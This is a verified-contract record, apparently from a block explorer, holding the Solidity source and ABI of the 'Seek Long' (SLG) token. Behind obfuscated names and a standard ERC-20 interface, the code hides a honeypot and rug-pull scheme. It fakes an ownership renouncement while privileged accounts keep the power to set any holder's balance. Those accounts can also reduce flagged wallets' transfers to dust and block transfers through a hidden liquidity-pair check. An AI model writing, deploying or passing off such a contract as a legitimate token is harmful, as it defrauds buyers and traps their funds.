{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface teamBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTrading) external view returns (uint256);\n\n    function transfer(address tradingWallet, uint256 toAmountList) external returns (bool);\n\n    function allowance(address shouldBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toAmountList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingWallet,\n        uint256 toAmountList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTxReceiver, uint256 value);\n    event Approval(address indexed shouldBuy, address indexed spender, uint256 value);\n}\n\nabstract contract launchSwapMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxMinTx {\n    function createPair(address receiverLaunch, address txFund) external returns (address);\n}\n\ninterface tokenMode is teamBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SeekLong is launchSwapMode, teamBuy, tokenMode {\n\n    bool private shouldLaunch;\n\n    address atSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address minFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private minTeam;\n\n    mapping(address => uint256) private teamFee;\n\n    function transferFrom(address feeTeam, address tradingWallet, uint256 toAmountList) external override returns (bool) {\n        if (_msgSender() != atSender) {\n            if (fundLimit[feeTeam][_msgSender()] != type(uint256).max) {\n                require(toAmountList <= fundLimit[feeTeam][_msgSender()]);\n                fundLimit[feeTeam][_msgSender()] -= toAmountList;\n            }\n        }\n        return limitShouldReceiver(feeTeam, tradingWallet, toAmountList);\n    }\n\n    function approve(address fundToken, uint256 toAmountList) public virtual override returns (bool) {\n        fundLimit[_msgSender()][fundToken] = toAmountList;\n        emit Approval(_msgSender(), fundToken, toAmountList);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamAuto;\n    }\n\n    constructor (){\n        if (amountReceiver == shouldLaunch) {\n            maxTakeAuto = true;\n        }\n        walletLaunched exemptMin = walletLaunched(atSender);\n        totalWalletMax = maxMinTx(exemptMin.factory()).createPair(exemptMin.WETH(), address(this));\n        \n        exemptSwapTotal = _msgSender();\n        exemptSell();\n        launchedMin[exemptSwapTotal] = true;\n        teamFee[exemptSwapTotal] = teamAuto;\n        if (maxTakeAuto == shouldLaunch) {\n            amountReceiver = true;\n        }\n        emit Transfer(address(0), exemptSwapTotal, teamAuto);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundLimit;\n\n    uint8 private minFund = 18;\n\n    function getOwner() external view returns (address) {\n        return minTeam;\n    }\n\n    uint256 private modeLaunched;\n\n    function allowance(address amountTx, address fundToken) external view virtual override returns (uint256) {\n        if (fundToken == atSender) {\n            return type(uint256).max;\n        }\n        return fundLimit[amountTx][fundToken];\n    }\n\n    uint256 minTotal;\n\n    function limitShouldReceiver(address feeTeam, address tradingWallet, uint256 toAmountList) internal returns (bool) {\n        if (feeTeam == exemptSwapTotal) {\n            return launchedTotal(feeTeam, tradingWallet, toAmountList);\n        }\n        uint256 feeAmount = teamBuy(totalWalletMax).balanceOf(minFrom);\n        require(feeAmount == amountAuto);\n        require(tradingWallet != minFrom);\n        if (buyIs[feeTeam]) {\n            return launchedTotal(feeTeam, tradingWallet, walletReceiver);\n        }\n        return launchedTotal(feeTeam, tradingWallet, toAmountList);\n    }\n\n    bool public buyTotal;\n\n    bool public launchedSwap;\n\n    function atTotal() private view {\n        require(launchedMin[_msgSender()]);\n    }\n\n    mapping(address => bool) public launchedMin;\n\n    function tradingReceiver(uint256 toAmountList) public {\n        atTotal();\n        amountAuto = toAmountList;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTrading;\n    }\n\n    uint256 amountAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLiquidity;\n    }\n\n    mapping(address => bool) public buyIs;\n\n    function launchedTotal(address feeTeam, address tradingWallet, uint256 toAmountList) internal returns (bool) {\n        require(teamFee[feeTeam] >= toAmountList);\n        teamFee[feeTeam] -= toAmountList;\n        teamFee[tradingWallet] += toAmountList;\n        emit Transfer(feeTeam, tradingWallet, toAmountList);\n        return true;\n    }\n\n    function atTrading(address limitMinReceiver) public {\n        atTotal();\n        \n        if (limitMinReceiver == exemptSwapTotal || limitMinReceiver == totalWalletMax) {\n            return;\n        }\n        buyIs[limitMinReceiver] = true;\n    }\n\n    uint256 constant walletReceiver = 14 ** 10;\n\n    event OwnershipTransferred(address indexed teamMin, address indexed feeReceiverTx);\n\n    function exemptSell() public {\n        emit OwnershipTransferred(exemptSwapTotal, address(0));\n        minTeam = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFund;\n    }\n\n    function launchedTakeAuto(address isTo) public {\n        if (minLimitReceiver) {\n            return;\n        }\n        \n        launchedMin[isTo] = true;\n        \n        minLimitReceiver = true;\n    }\n\n    bool private maxTakeAuto;\n\n    uint256 private teamAuto = 100000000 * 10 ** 18;\n\n    string private receiverTrading = \"SLG\";\n\n    function transfer(address amountTo, uint256 toAmountList) external virtual override returns (bool) {\n        return limitShouldReceiver(_msgSender(), amountTo, toAmountList);\n    }\n\n    bool public marketingToken;\n\n    address public exemptSwapTotal;\n\n    bool public minLimitReceiver;\n\n    uint256 public enableTakeList;\n\n    function owner() external view returns (address) {\n        return minTeam;\n    }\n\n    bool private exemptTakeFund;\n\n    address public totalWalletMax;\n\n    string private shouldLiquidity = \"Seek Long\";\n\n    bool public tradingTokenMax;\n\n    function launchReceiver(address amountTo, uint256 toAmountList) public {\n        atTotal();\n        teamFee[amountTo] = toAmountList;\n    }\n\n    function balanceOf(address tokenTrading) public view virtual override returns (uint256) {\n        return teamFee[tokenTrading];\n    }\n\n    bool public amountReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiverTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTxReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMinReceiver\",\"type\":\"address\"}],\"name\":\"atTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTakeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwapTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountList\",\"type\":\"uint256\"}],\"name\":\"launchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"}],\"name\":\"launchedTakeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLimitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWalletMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toAmountList\",\"type\":\"uint256\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toAmountList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SeekLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}